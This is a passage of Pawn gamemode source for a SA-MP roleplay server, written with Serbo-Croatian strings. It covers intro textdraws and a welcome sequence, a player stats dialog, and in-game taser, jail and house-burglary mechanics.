		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][10], 0.115106, 0.649895);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][10], 2);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][10], -1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][10], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][10], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][10], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][10], 2);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][10], 1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][10], 0);

		ServerIntro_pTD[playerid][11] = CreatePlayerTextDraw(playerid, 428.533325, 49.382190, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][11], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][11], 2.000000, 15.979997);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][11], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][11], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][11], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][11], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][11], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][11], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][11], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][11], 0);

		ServerIntro_pTD[playerid][12] = CreatePlayerTextDraw(playerid, 416.977630, 55.355514, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][12], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][12], 2.000000, 9.960021);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][12], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][12], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][12], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][12], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][12], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][12], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][12], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][12], 0);

		ServerIntro_pTD[playerid][13] = CreatePlayerTextDraw(playerid, 417.077636, 64.013298, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][13], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][13], 13.260004, 2.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][13], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][13], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][13], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][13], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][13], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][13], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][13], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][13], 0);

		ServerIntro_pTD[playerid][14] = CreatePlayerTextDraw(playerid, 419.688751, 61.124416, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][14], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][14], 8.000000, 2.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][14], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][14], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][14], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][14], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][14], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][14], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][14], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][14], 0);

		ServerIntro_pTD[playerid][15] = CreatePlayerTextDraw(playerid, 419.588806, 53.273269, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][15], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][15], 2.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][15], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][15], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][15], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][15], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][15], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][15], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][15], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][15], 0);

		ServerIntro_pTD[playerid][16] = CreatePlayerTextDraw(playerid, 425.877868, 51.077739, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][16], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][16], 2.000000, 12.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][16], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][16], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][16], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][16], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][16], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][16], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][16], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][16], 0);

		ServerIntro_pTD[playerid][17] = CreatePlayerTextDraw(playerid, 197.488906, 46.082233, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][17], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][17], 134.000000, 1.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][17], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][17], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][17], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][17], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][17], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][17], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][17], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][17], 0);

		ServerIntro_pTD[playerid][18] = CreatePlayerTextDraw(playerid, 331.722045, 42.557777, "..........");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][18], 0.151666, 0.573911);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][18], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][18], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][18], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][18], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][18], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][18], 1);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][18], 1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][18], 0);

		for(new i = 0; i < 19; i++) PlayerTextDrawShow(playerid, ServerIntro_pTD[playerid][i]);
	}
	else
	{
		for(new i = 0; i < 19; i++)
		{
		    PlayerTextDrawHide(playerid, ServerIntro_pTD[playerid][i]);
			PlayerTextDrawDestroy(playerid, ServerIntro_pTD[playerid][i]);
			ServerIntro_pTD[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}
//------------------------------------------------------------------------------
_:public PocetniIntro(playerid, izbor) 
{
	new str[325];
	ClearChat(playerid, 20);
	switch(izbor) 
	{
	    case 1: 
	    {
	    	ControlIntroTextDraws(playerid, true);
	    	pocetni_intro[playerid] = SetPlayerTimerEx(playerid, "PocetniIntro", 1000, false, "ii", playerid, izbor+1);
		}
		case 2: 
		{
	    	format(str, 40, "Pozdrav, ~y~%s.", ImeIgraca(playerid));
	    	PlayerTextDrawSetString(playerid, ServerIntro_pTD[playerid][3], str);
	    	PlayerTextDrawShow(playerid, ServerIntro_pTD[playerid][3]);
	    	pocetni_intro[playerid] = SetPlayerTimerEx(playerid, "PocetniIntro", 4500, false, "ii", playerid, izbor+1);
		}
		case 3: 
		{
	    	format(str, 115, 
	    					"Pozdrav, ~y~%s.~n~\
	    					~w~Dobrodosli na ~y~Ultimate RPG ~w~server, idemo par rijeci o nama...", 
	    						ImeIgraca(playerid));

	    	PlayerTextDrawSetString(playerid, ServerIntro_pTD[playerid][3], str);
	    	PlayerTextDrawShow(playerid, ServerIntro_pTD[playerid][3]);
	    	pocetni_intro[playerid] = SetPlayerTimerEx(playerid, "PocetniIntro", 4500, false, "ii", playerid, izbor+1);
		}
		case 4: 
		{
	    	format(str, 175, 
	    					"Pozdrav, ~y~%s.~n~\
	    					~w~Dobrodosli na ~y~Ultimate RPG ~w~server, idemo par rijeci o nama...~n~\
	    					~w~Vlasnik zajednice kao i ovog servera je ~y~Kristijan.~n~", 
	    						ImeIgraca(playerid));

	    	PlayerTextDrawSetString(playerid, ServerIntro_pTD[playerid][3], str);
	    	PlayerTextDrawShow(playerid, ServerIntro_pTD[playerid][3]);
	    	pocetni_intro[playerid] = SetPlayerTimerEx(playerid, "PocetniIntro", 4500, false, "ii", playerid, izbor+1);
		}
		case 5: 
		{
	    	format(str, 230, 
	    					"Pozdrav, ~y~%s.~n~\
	    					~w~Dobrodosli na ~y~Ultimate RPG ~w~server, idemo par rijeci o nama...~n~\
	    					~w~Vlasnik zajednice kao i ovog servera je ~y~Kristijan.~n~\
	    					~w~Skripteri servera su ~y~Saco i Ghetoven.~n~", 
	    						ImeIgraca(playerid));

	    	PlayerTextDrawSetString(playerid, ServerIntro_pTD[playerid][3], str);
	    	PlayerTextDrawShow(playerid, ServerIntro_pTD[playerid][3]);
	    	pocetni_intro[playerid] = SetPlayerTimerEx(playerid, "PocetniIntro", 4500, false, "ii", playerid, izbor+1);
		}
		case 6: 
		{
	    	format(str, 270, 
	    					"Pozdrav, ~y~%s.~n~\
	    					~w~Dobrodosli na ~y~Ultimate RPG ~w~server, idemo par rijeci o nama...~n~\
	    					~w~Vlasnik zajednice kao i ovog servera je ~y~Kristijan.~n~\
	    					~w~Skripteri servera su ~y~Saco i Ghetoven.~n~\
	    					~w~Maperi servera su ~y~Begovic i Nile.~n~", 
	    						ImeIgraca(playerid));

	    	PlayerTextDrawSetString(playerid, ServerIntro_pTD[playerid][3], str);
	    	PlayerTextDrawShow(playerid, ServerIntro_pTD[playerid][3]);
	    	pocetni_intro[playerid] = SetPlayerTimerEx(playerid, "PocetniIntro", 4500, false, "ii", playerid, izbor+1);
		}
		case 7: 
		{
	    	format(str, 325, 
	    					"Pozdrav, ~y~%s.~n~\
	    					~w~Dobrodosli na ~y~Ultimate RPG ~w~server, idemo par rijeci o nama...~n~\
	    					~w~Vlasnik zajednice kao i ovog servera je ~y~Kristijan.~n~\
	    					~w~Skripteri servera su ~y~Saco i Ghetoven.~n~\
	    					~w~Maperi servera su ~y~Begovic i Nile.~n~\
	    					~w~Uzivajte uz nas server, nasu ekipu, nasu skriptu!", 
	    						ImeIgraca(playerid));

	    	PlayerTextDrawSetString(playerid, ServerIntro_pTD[playerid][3], str);
	    	PlayerTextDrawShow(playerid, ServerIntro_pTD[playerid][3]);
	    	pocetni_intro[playerid] = SetPlayerTimerEx(playerid, "PocetniIntro", 4500, false, "ii", playerid, izbor+1);
		}
		case 8: 
		{
		 	InterpolateCameraPos(playerid, 1430.4233, -983.3195, 1006.5151, 1439.1078, -983.3801, 1006.5151, 45000, CAMERA_MOVE);
			InterpolateCameraLookAt(playerid, 1430.7269, -982.3676, 1006.1650, 1438.6672, -982.4836, 1006.1701, 42000, CAMERA_MOVE);

			PocetniIntroStartovan[ playerid ] = false;
			playerInIntro[playerid] = false;

		    new string[1500] = "\0";
		    format(str, 160, "{FFFFFF}%s, dobrodosao/la na {4282C0}UP - RPG {FFFFFF}server.\nPosto nalog {4282C0}nije pronadjen {FFFFFF}u bazi", ImeIgraca( playerid ) );
		    strcat(string, str);
		    strcat(string, " podataka, morate se {4282C0}registrovati{FFFFFF}.\n\n");
			strcat(string, "{4282C0}________________________________________________________________________________________________________\n\n");
		    strcat(string, "{FFFFFF}Klikom na tipku {4282C0}'Prihvatam' {FFFFFF}prihvatate sljedece stvari:\n\n");
		    strcat(string, "\t- Obavezni ste postovati {4282C0}glavna pravila{FFFFFF} servera - {4282C0}[ /pravilaservera ]{FFFFFF};\n");
			strcat(string, "\t- Zabranjeno je bilo kakvo {4282C0}vrijedjanje, psovanje{FFFFFF} i sve ostalo sto spada u isto;\n");
			strcat(string, "\t- {4282C0}Zabranjeno{FFFFFF} je koristenje {4282C0}bugova{FFFFFF}(gresaka u skripti). Za to se dobija {4282C0}ban;\n");
			strcat(string, "\t- {4282C0}Zabranjeno{FFFFFF} je koristi bilo kakve {4282C0}nedozvoljene modove;\n");
			strcat(string, "\t- {4282C0}Zabranjeno{FFFFFF} je {4282C0}varati{FFFFFF} druge igrace;\n");
			strcat(string, "\t- Za svoj {4282C0}account{FFFFFF}(lozinku) odgovarate {4282C0}samo vi{FFFFFF};\n");
			strcat(string, "\t- Morate {4282C0}postovati {FFFFFF}odluke {4282C0}administracije.\n\n");
			ShowPlayerDialog(playerid, dialog_USLOVIKORISCENJA, DIALOG_STYLE_MSGBOX, "{4282C0}ULTIMATE - {FFFFFF}Uslovi koriscenja:", string, "Prihvatam", "Odbijam" );			
		}
	}
}
//------------------------------------------------------------------------------
_:public ShowDialogStats( playerid, targetid )
{
    if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) )
	{
	    new str[ 1024 ], drzava[ 32 ];

	    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		strcat( DialogStrgEx, "{FFFFFF}** Licna karta:\n" );

        switch( PlayerInfo[ targetid ][ xDrzava ] )
		{
            case 1: { drzava = "Makedonija"; }
            case 2: { drzava = "Hrvatska"; }
            case 3: { drzava = "Srbija"; }
            case 4: { drzava = "Montenegro"; }
            case 5: { drzava = "Bosna i Hercegovina"; }
            case 6: { drzava = "Other"; }
		}

		format( str, sizeof( str ),
			"{4282C0}Ime i prezime: {FFFFFF}[%s]\n{4282C0}Pol: {FFFFFF}[%s]\n{4282C0}Godine: {FFFFFF}[%d]\n{4282C0}Drzava: {FFFFFF}[%s]\n\n",
			    ImeIgraca( targetid ),
				PlayerInfo[targetid][xPol] == 1 ? "Musko" : "Zensko",
				PlayerInfo[ targetid ][ xGodine ],
				drzava );
        strcat( DialogStrgEx, str );

        strcat( DialogStrgEx, "{FFFFFF}** Posao:\n" );
        format( globalstring, sizeof( globalstring ),
			"{4282C0}Ime: {FFFFFF}[%s]\n\n", getJobName( PlayerInfo[ targetid ][ xPosao ] ) );
		strcat( DialogStrgEx, globalstring );

        strcat( DialogStrgEx, "{FFFFFF}** Organizacija:\n" );
		format( str, sizeof( str ),
			"{4282C0}Ime: {FFFFFF}[%s]\n{4282C0}Rank: {FFFFFF}[%s]\n{4282C0}Vreme u org: {FFFFFF}[%sh]\n{4282C0}Kazneni ugovor: {FFFFFF}[%sh]\n\n",
				getOrgName( PlayerInfo[ targetid ][ xClan ] ),
				getOrgRank( targetid, PlayerInfo[ targetid ][ xClan ] ),
				fNumber(PlayerInfo[ targetid ][ xOrgUgovor ]),
				fNumber(PlayerInfo[ targetid ][ xKazneniUgovor ]));
		strcat( DialogStrgEx, str );

	    strcat( DialogStrgEx, "{FFFFFF}** Novcano stanje:\n" );
	    format( str, sizeof( str ), "{4282C0}Dzep: {FFFFFF}[$%s]\n{4282C0}Banka: {FFFFFF}[$%s]\n{4282C0}Zlato: {FFFFFF}[%sg]\n{4282C0}Dijamanti: {FFFFFF}[%sg]\n\n",
			fNumber(PlayerInfo[ targetid ][ xNovac ]),
			fNumber(PlayerInfo[ targetid ][ xBRacun ]),
			fNumber(PlayerInfo[ targetid ][ xZlato ]),
			fNumber(PlayerInfo[ targetid ][ xDiamond ]));
		strcat( DialogStrgEx, str );

	    new nxtlevel = PlayerInfo[ targetid ][ xLevel ]+1,
		    expamount = nxtlevel*levelexp,
			exp = PlayerInfo[ targetid ][ xRespekt ];

        strcat( DialogStrgEx, "{FFFFFF}** Opste informacije:\n" );
	 	format( str, sizeof( str ),
		 	"{4282C0}Datum registracije: {FFFFFF}[%s]\n{4282C0}Level: {FFFFFF}[%s]\n{4282C0}Sati igranja: {FFFFFF}[%sh]\n{4282C0}Respekti: {FFFFFF}[%d/%d]\n{4282C0}Spawn Health: {FFFFFF}[%.2f]\n\
		 	{4282C0}Admin: {FFFFFF}[%s(A:%d)]\n{4282C0}Spec Admin: {FFFFFF}[%s]\n{4282C0}Gamemaster: {FFFFFF}[%d]\n{4282C0}VIP: {FFFFFF}[%d]\n{4282C0}Promoter: {FFFFFF}[%d]\n{4282C0}YouTuber: {FFFFFF}[%d]\n{4282C0}Vreme do plate: {FFFFFF}[%d min]\n",
	            PlayerInfo[ targetid ][ xRegDate ],
				fNumber(PlayerInfo[ targetid ][ xLevel ]),
				fNumber(PlayerInfo[ targetid ][ xOnlineSati ]),
				exp,
				expamount,
				(50+PlayerInfo[ targetid ][ xSHealth ]),
				getAdminRankName( targetid ), PlayerInfo[targetid][xAdmin],
				((PlayerInfo[ targetid ][ xSpecAdmin ]) ? ("Da") : ("Ne")),
				PlayerInfo[ targetid ][ xGamemaster ],
				PlayerInfo[ targetid ][ xVIPLevel ],
				PlayerInfo[targetid][xPromoter],
				PlayerInfo[targetid][xYouTuber],
				(60-PlayerInfo[ targetid ][ xPayDay ]) );
        strcat( DialogStrgEx, str );

		format( str, sizeof( str ),
			"{4282C0}Telefon: {FFFFFF}%d\n{4282C0}Uhapsen: {FFFFFF}%s\n{4282C0}Brak: {FFFFFF}%s\n{4282C0}Upozorenja {FFFFFF}[%d/5]\n{4282C0}U-Poen: {FFFFFF}[%s]\
				\n{4282C0}Tiki: {FFFFFF}[%s]\n\n",
	            PlayerInfo[ targetid ][ xBrojTelefona ],
				fNumber(PlayerInfo[ targetid ][ xUhapsen ]),
				PlayerInfo[ targetid ][ xMarriedTo ],
				PlayerInfo[ targetid ][ xWarn ],
				fNumber(PlayerInfo[ targetid ][ xUPoen ]),
				fNumber(PlayerInfo[ targetid ][ xTiki ]));

	    strcat( DialogStrgEx, str );

	    new year, month,day, tmphour, tmpminute, tmpsecond;
		getdate( year, month, day );
		gettimeEx( tmphour, tmpminute, tmpsecond );
		FixHour( tmphour );
		tmphour = shifthour;
	   	format( str, sizeof( str ), "					%02d/%02d/%d - %s%d:%s%d:%s%d", day, month, year, (tmphour < 10) ? ("0") : (""), tmphour, (tmpminute < 10) ? ("0") : (""), tmpminute, (tmpsecond < 10) ? ("0") : (""), tmpsecond );
        strcat( DialogStrgEx, str );


		playerStatsPage[ playerid ] = 0;
		playerStatsTargetID[ playerid ] = targetid;
	    ShowPlayerDialog( playerid, dialog_STATISTIKAIGRACA, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "Napred", "Zatvori" );
    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	}
}
//------------------------------------------------------------------------------
_:public ShowPDStats( playerid, targetid )
{
	if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) )
	{
	    new coordsstring[84];
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		format( coordsstring, sizeof( coordsstring ), "{4282C0}*** %s ***\n", ImeIgraca( targetid ) );
		strcat( DialogStrgEx, coordsstring );
		format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Dao ticketa: [%d] | Oduzeo novaca preko ticketa: [%d]\n", PlayerInfo[ targetid ][ xPDStatsTicket ], PlayerInfo[ targetid ][ xPDStatsTicketMoney ] );
        strcat( DialogStrgEx, coordsstring );
		format( coordsstring, sizeof( coordsstring ), "Oduzeo oruzja: [%d] |  Oduzeo droge: [%dg]\n", PlayerInfo[ targetid ][ xTakenWeps ], PlayerInfo[ targetid ][ xTakenDrugs ] );
        strcat( DialogStrgEx, coordsstring );
        format( coordsstring, sizeof( coordsstring ), "Puta uhitio nekoga: [%d]\n", PlayerInfo[ targetid ][ xPDUhapsio ] );
        strcat( DialogStrgEx, coordsstring );

        ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	}
}
//------------------------------------------------------------------------------
_:public BackupClear(playerid, calledbytimer)
{
	if( GetFactionType( playerid ) == ORG_TIP_VLADINA  )
	{
		if( RequestingBackup[playerid] )
		{
			foreach( new i : Player)
			{
				if( org_info[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA )
				{
					SMG_DisablePlayerCheckpoint( i );
				}
			}
			if( calledbytimer != 1 )
			{
				SendClientMessage( playerid, 0x8D8DFFFF, "(BACKUP): Vase pojacanje je izbrisano." );
			}
			else
			{
				SendClientMessage( playerid, 0x8D8DFFFF, "(BACKUP): Vas zahtev za pojacanje je izbrisano automatski." );
			}
			RequestingBackup[playerid] = false;
		}
		else
		{
			if(calledbytimer != 1 )
			{
				SendClientMessage( playerid, 0x8D8DFFFF, "(BACKUP): Nemate aktivan zahtev za pojacanje!");
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
bool:IsPlayerAiming(playerid)
{
	switch(GetPlayerCameraMode(playerid))
	{
		case 7, 8, 46, 51, 53: return true;
	}
	return false;
}
//------------------------------------------------------------------------------
public OnPlayerDamage(&playerid, &Float:amount, &issuerid, &weapon, &bodypart)
{
	if(AdminDuty[ playerid ] && !IsPlayerInAnyVehicle(playerid)) return 0;

	if( issuerid != IPI )
	{
		if( org_info[ PlayerInfo[ issuerid ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA 
			&& !IsPlayerInAnyVehicle( issuerid ) && !IsPlayerInAnyVehicle( playerid ) && GetWeapon( issuerid ) == 23 
			&& ImaTazer[ issuerid ] == true && !AdminDuty[ playerid ] 
			&& !IsPlayerAiming(playerid))
		{
		    if( GetFactionType( playerid ) == ORG_TIP_VLADINA ) return SendClientMessage( issuerid, CRVENA, "(TAZER): Ne mozes tazovati policiju." );

			new Float:Pos[ 3 ];
			GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
			if( IsPlayerInRangeOfPoint( issuerid, 30.0, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] ) )
			{
				SendNearbyMessage(issuerid, 30.0, 0xC2A2DAFF, "%s puca tazerom na %s-a i pogadja ga.", ImeIgraca( issuerid ), ImeIgraca( playerid ) );
				SMG_TogglePlayerControllable( playerid, false );

				PlayerCuffed[ playerid ] = 1;
				SetPlayerHealth( playerid, 50 );
				CuffTimerCalled[playerid] = true;
				OnePlayAnim( playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0 );
				tazovan_tajmer[playerid] = SetPlayerTimerEx(playerid, "TazovanTajmer", 10000, false, "i", playerid);
				return 0;
			}
        }

        if( tdm_player_info[ playerid ][ tdm_Team ] != 0 && tdm_player_info[ issuerid ][ tdm_Team ] != 0 )
		{
			if( tdm_player_info[ playerid ][ tdm_Team ] == tdm_player_info[ issuerid ][ tdm_Team ] )
			{
			    GameTextForPlayer( issuerid, "~r~Ne pucaj svoje suigrace!", 3000, 5 );
	        }
	        if( bodypart == 9 )
			{
	            new Float:HP;
				GetPlayerHealth( playerid, HP );
				if( HP <= 35 )
				{
					send_tdm_message( -1, "{FFFFFF}%s {FF0000}headshotted {FFFFFF}%s.", ImeIgraca( issuerid ), ImeIgraca( playerid ) );
					SetPlayerHealth( playerid, 0 );
				}
			}
		}
	}
	return 1;

}

_:public TazovanTajmer( playerid )
{
	if( PlayerCuffed[ playerid ] == 1 )
	{
		PlayerCuffed[ playerid ] = 0;
		CuffTimerCalled[playerid] = false;
		SMG_TogglePlayerControllable( playerid, true );
		GameTextForPlayer( playerid, "~y~Tazer zavrsen.", 5000, 3 );
		ClearAnimations( playerid );
        KillTimer(tazovan_tajmer[playerid]);
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public OtherCheck( playerid )
{
	if( PlayerInfo[ playerid ][ xZatvor ] > 0 )
	{
	    if(PlayerInfo[ playerid ][ xZatvorVreme ] > 0 ) PlayerInfo[ playerid ][ xZatvorVreme ] -= 1;
	    else if( PlayerInfo[ playerid ][ xZatvorVreme ] <= 0 )
		{
		    if( PlayerInfo[ playerid ][ xZatvor ] == JAIL )
			{
				SMG_SetPlayerPos( playerid, 1536.2214,-1663.0848,13.5469 );
			    UcitajObjekte( playerid );
			   	SetCameraBehindPlayer( playerid );
			   	SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );
		    }
		    else if( PlayerInfo[ playerid ][ xZatvor ] == PRISON )
			{
		        SetPlayerWorldBounds( playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
			    SetPlayerInterior( playerid, 0 );
			    SetPlayerVirtualWorld( playerid, 0 );
			    SMG_SetPlayerPos( playerid, 1536.2214,-1663.0848,13.5469 );
		    }
		    PlayerInfo[ playerid ][ xZatvor ] = 0;
			PlayerInfo[ playerid ][ xZatvorVreme ] = 0;

		    new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '%d', `jail_time` = '%d' WHERE `user_id` = '%d' LIMIT 1",
				PlayerInfo[ playerid ][ xZatvor ],
				PlayerInfo[ playerid ][ xZatvorVreme ],
				PlayerInfo[ playerid ][ xID ] );
			mysql_tquery( mSQL, q );

		    SendInfoMessage( playerid, "Platili ste svoj dug drustvu." );
		    GameTextForPlayer( playerid, "~g~Sloboda.~n~~w~Pokusajte biti bolji gradjanin!", 5000, 1);
	    }
	}
}
//------------------------------------------------------------------------------
_:public CrimInRange( Float:radi, playerid, copid )
{
	if( IsPlayerConnected( playerid ) && IsPlayerConnected( copid ) )
	{
		new Float:posx, Float:posy, Float:posz,
		    Float:oldposx, Float:oldposy, Float:oldposz,
			Float:tempposx, Float:tempposy;

		GetPlayerPos( playerid, oldposx, oldposy, oldposz);
		GetPlayerPos(copid, posx, posy, posz);

		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);

		if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)))
		{
			return 1;
		}
	}
	return(false);
}
//------------------------------------------------------------------------------
_:public Provala( playerid )
{
    foreach(new i : iter_Imovina)
	{
		if( IsPlayerInRangeOfPoint( playerid, 2, II[  i][ iEnter ][ 0 ], II[  i][ iEnter ][ 1 ], II[  i][ iEnter ][ 2 ] ) )
		{
		    if(PokusajProvala[playerid])
			{
		        if( II[ i ][ iAlarm ] == 1 )
				{
		            SendNearbyMessage(playerid, 60.0, 0xC2A2DAFF, "(%s ALARM): BEEP BEEP BEEP!!!", II[ i ][ iAdress ] );
				}
				else if( II[ i ][ iAlarm ] == 2)
				{
				    foreach( new h : Player)
					{
  						if( strcmp( ImeIgraca( h ), II[ i ][ iOwner ], true) == 0 )
	   					{
				   		    SendClientMessage( h, ZUTA, "(SMS): Netko vam je provalio bravu! Pozovite policiju, Vas alarm!");
			   			}
					}
				    SendNearbyMessage(playerid, 60.0, 0xC2A2DAFF, "(%s ALARM): BEEP BEEP BEEP!!!", II[ i ][ iAdress ] );
				}
				else if( II[ i ][ iAlarm ] >= 3)
				{
				    foreach( new h : Player)
					{
   						if( strcmp( ImeIgraca( h ), II[ i ][ iOwner ], true) == 0 )
						{
					 	    SendClientMessage( h, ZUTA, "(SMS): Netko vam pokusava provaliti u kucu, Vas alarm!" );
   						}
					}
					for( new id = 1; id < MAX_ORG; id++)
					{
		    			if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
						{
							OrgPoruka( id, 0x2641FEFF, "(HQ): Svim jedinicama: Prijavio: Tihi Alarm" );
							OrgPoruka( id, 0x2641FEFF, "(HQ): Zlocin: Provala u kucu | Osumnjiceni: Nepoznat" ); 
							OrgPoruka( id, 0x2641FEFF, "(HQ): Adresa kuce: %s", II[ i ][ iAdress ] );
						    SendNearbyMessage(playerid, 60.0, 0xC2A2DAFF, "(%s ALARM): BEEP BEEP BEEP!!!", II[ i ][ iAdress ] );
						}
					}
				}
    			II[ i ][ iLocked ] = 0;
				Odbrojavanje[ playerid ] = 0;
				SendInfoMessage(playerid, "Onesposobili ste bravu, sada mozete uci u kucu.");
